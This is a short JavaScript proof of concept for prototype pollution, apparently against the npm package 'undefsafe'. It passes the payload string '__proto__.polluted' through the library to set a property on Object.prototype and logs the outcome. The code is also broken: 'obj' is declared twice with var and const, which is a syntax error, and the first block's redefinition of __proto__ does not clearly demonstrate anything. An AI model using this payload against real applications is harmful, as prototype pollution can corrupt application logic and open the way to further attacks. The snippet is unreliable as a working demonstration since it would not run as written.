var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const a = require('undefsafe');
const obj = {};
const payload = '__proto__.polluted';
a(obj, payload, 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');